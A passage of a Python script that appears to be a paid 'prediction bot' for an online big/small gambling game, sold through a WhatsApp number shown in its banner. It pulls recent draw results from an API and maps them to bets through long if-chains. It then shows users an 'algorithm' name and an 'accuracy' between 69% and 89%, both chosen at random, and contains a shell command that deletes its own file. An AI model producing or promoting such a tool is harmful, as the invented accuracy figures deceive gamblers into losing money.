       auto_besarX13()
      elif res == '8':
       auto_besarX13()
      elif res == '9':
       auto_besarX13()
      elif res == '10':
       auto_kecilX13()
      elif res == '11':
       auto_kecilX13()
      elif res == '12':
       auto_kecilX13()
      elif res == '13':
       auto_kecilX13()
      elif res == '14':
       auto_kecilX13()
      elif res == '15':
       auto_besarX13()
      elif res == '16':
       auto_besarX13()
      elif res == '17':
       auto_besarX13()
      elif res == '18':
       auto_besarX13()
      elif res == '19':
       auto_besarX13()
      elif res == '20':
       auto_kecilX13()
      elif res == '21':
       auto_kecilX13()
      elif res == '22':
       auto_kecilX13()
      elif res == '23':
       auto_kecilX13()
      elif res == '24':
       auto_kecilX13()
      elif res == '25':
       auto_besarX13()
      elif res == '26':
       auto_besarX13()
      elif res == '27':
       auto_besarX13()
      elif res == '28':
       auto_besarX13()
      elif res == '29':
       auto_besarX13()
      elif res == '30':
       auto_kecilX13()
      elif res == '31':
       auto_kecilX13()
      elif res == '32':
       auto_kecilX13()
      elif res == '33':
       auto_kecilX13()
      elif res == '34':
       auto_kecilX13()
      elif res == '35':
       auto_besarX13()
      elif res == '36':
       auto_besarX13()
      elif res == '37':
       auto_besarX13()
      elif res == '38':
       auto_besarX13()
      elif res == '39':
       auto_besarX13()
      else:
       auto_kecilX13()
       
       
def rumusX14 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }

      response = response_GetNoaverageEmerdList()
      b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
          f.write(str(e10))
          f.close()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      wwr = d[0].get('colour')
      ff = d[0].get('number')
      with open("Num.txt", 'w') as g:
          g.write(ff)
          g.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(4)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX14()
      elif res == '1':
       auto_kecilX14()
      elif res == '2':
       auto_besarX14()
      elif res == '3':
       auto_kecilX14()
      elif res == '4':
       auto_kecilX14()
      elif res == '5':
       auto_besarX14()
      elif res == '6':
       auto_besarX14()
      elif res == '7':
       auto_besarX14()
      elif res == '8':
       auto_besarX14()
      elif res == '9':
       auto_besarX14()
      elif res == '10':
       auto_kecilX14()
      elif res == '11':
       auto_kecilX14()
      elif res == '12':
       auto_kecilX14()
      elif res == '13':
       auto_kecilX14()
      elif res == '14':
       auto_kecilX14()
      elif res == '15':
       auto_besarX14()
      elif res == '16':
       auto_besarX14()
      elif res == '17':
       auto_besarX14()
      elif res == '18':
       auto_besarX14()
      elif res == '19':
       auto_besarX14()
      elif res == '20':
       auto_kecilX14()
      elif res == '21':
       auto_kecilX14()
      elif res == '22':
       auto_kecilX14()
      elif res == '23':
       auto_kecilX14()
      elif res == '24':
       auto_kecilX14()
      elif res == '25':
       auto_besarX14()
      elif res == '26':
       auto_besarX14()
      elif res == '27':
       auto_besarX14()
      elif res == '28':
       auto_besarX14()
      elif res == '29':
       auto_besarX14()
      elif res == '30':
       auto_kecilX14()
      elif res == '31':
       auto_kecilX14()
      elif res == '32':
       auto_kecilX14()
      elif res == '33':
       auto_kecilX14()
      elif res == '34':
       auto_kecilX14()
      elif res == '35':
       auto_besarX14()
      elif res == '36':
       auto_besarX14()
      elif res == '37':
       auto_besarX14()
      elif res == '38':
       auto_besarX14()
      elif res == '39':
       auto_besarX14()
      else:
       auto_besarX14()
       
from datetime import datetime, timezone, timedelta

JKT = timezone(timedelta(hours=+7))
dt = datetime(2023, 7, 9, tzinfo=JKT)
localtime = time.localtime(time.time())
xx = localtime
b = datetime.now()
c = b.day
f = b.hour

d = 5
e = 6
f = 7
g = 8
h = 1
gt = ['RNG-1','RNG-2','RNG-3','RNG-4','RNG-5']
to = ['Recursive','Brute Force','Loop','Greedy','Backtracking','Hashing']
bk = ['69%','73%','71%','75%','77%','80%','83%','85%','86%','78%','73%','88%','89%']
ii = ['ikuti 2x dan lawan 1x','ikuti 3x dan lawan 2x',' ikuti 1x dan lawan 2x','ikuti 2x dan lawan 2x']
hh = random.SystemRandom()
jk = hh.choice(gt)
po = hh.choice(to)
tty = hh.choice(bk)
iii = hh.choice(ii)
if c == b:
	os.system("clear")
	os.system("rm 55fivev2.py")
	time.sleep
	exit(10)
else:
	os.system("clear")
	print(GRY+f"{Y}╔════════════════════════════{G}•{PT}════════════════════════════╗")
	print(f" {GRY}═════════════{G}• {Y}WELCOME TO BO{PT}T PREDICTIONS {G}•{GRY}══════════════")
	print(GRY+f"{Y}╚════════════════════════════{G}•{PT}════════════════════════════╝")
	print(GRY+f"{Y}╔════════════════════════════{G}•{PT}════════════════════════════╗")
	print(f"""{CYAN}
    ███████╗███████╗███████╗            {GR}[INFORMASI]{L}
    {CYAN}██╔════╝██╔════╝██╔════╝         
    {CYAN}██████╗░██████╗░█████╗       {PT}🔹AUTOR   = Racknarock{L}
    {CYAN}╚════██╗╚════██╗██╔══╝       {PT}🔹RNGv?   = {GRY}Searching..{L}
    {CYAN}██████╔╝██████╔╗██║░░░██     {PT}🔹LOGIN   = OWNER{L}
    {CYAN}╚═════╝░╚═════╝░╚═╝          {PT}🔹SERVER  = {H}OFFLINE{L}
""")
	print(GRY+f"{Y}╚════════════════════════════{G}•{PT}════════════════════════════╝")
	print(f' {GRY}Syncron To RNG...')
os.system("clear")
whoami2()
whoami2()
print(GRY+f"{Y}╔════════════════════════════{G}•{PT}════════════════════════════╗")
print(f" {GRY}═════════════{G}• {Y}WELCOME TO BO{PT}T PREDICTIONS {G}•{GRY}══════════════")
print(GRY+f"{Y}╚════════════════════════════{G}•{PT}════════════════════════════╝")
print(GRY+f"{Y}╔════════════════════════════{G}•{PT}════════════════════════════╗")
print(f"""{Y}
    ███████╗███████╗███████╗            {GR}[INFORMASI]{L}
    {Y}██╔════╝██╔════╝██╔════╝         
    {Y}██████╗░██████╗░█████╗       {PT}🔹AUTOR   = Racknarock{L}
    {Y}╚════██╗╚════██╗██╔══╝       {PT}🔹RNGv17V = {GRY}Ready
    {Y}██████╔╝██████╔╗██║░░░██     {PT}🔹LOGIN   = Sentinental
    {Y}╚═════╝░╚═════╝░╚═╝          {PT}🔹SERVER  = {WW}ONLINE{L}{PT1} •RNG {L}
""")
print(GRY+f"{Y}╚════════════════════════════{G}•{PT}════════════════════════════╝")
print(G+f'  {Y}///////    Order SC : Whats{PT}app 085796297189    \\\\\\\\\\\\\\')
print(GRY+f"{Y}╔════════════════════════════{G}•{PT}════════════════════════════╗")
print(b.strftime(f"{GR1}                  %A, %d %B %Y {L}"))
print(GRY+f"{Y}╚════════════════════════════{G}•{PT}════════════════════════════╝")
print(f"{GR1}                        Tips &{GR1} Trick{L}")
print(f"{GR1} Kompen 2x-3x Harap Reload  {GR}(CTRL+Z){L} lalu {GR}(CTRL+P (Enter)){L}")
print(f'                      {G}•{Y}══════{G}•{PT}══════{G}•              ')
print(f'               {G}•{PT}══════{G}•{Y}══════{G}•{PT}══════{G}•{Y}══════{G}•              ')
print(f' {PT}Algoritma  : {G}{po} {L} {GR1}(Reload To Change Algoritma) ')     
print(f' {PT1}Akurasi{L}    : {PT1} {tty} {L}')
print(L+GRY+"┏━━━━━━━━━━━━━━━┳━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━┳━━━━━━━━━━┓")
print(GRY+f"┃{GR}    {GR1}{GRY}Periode    {L}{GRY}┃{GR}{GR1}{GRY}Feeling{L}{GRY}┃{GR}   {GR1}{GRY}Prediksi   {L}{GRY}┃{GR} {GR1}{GRY}Hasil {L}{GRY}┃{GR}  {GR1}{GRY}Status  {L}{GRY}┃")
print(L+GRY+"┣━━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━━━━━╋━━━━━━━╋━━━━━━━━━━┫")
rumusX1()
aa = open("halaman1.txt").read()
if aa > '4':
    rumusX1()
elif aa < '5':
    rumusX1()
else:
    rumusX0()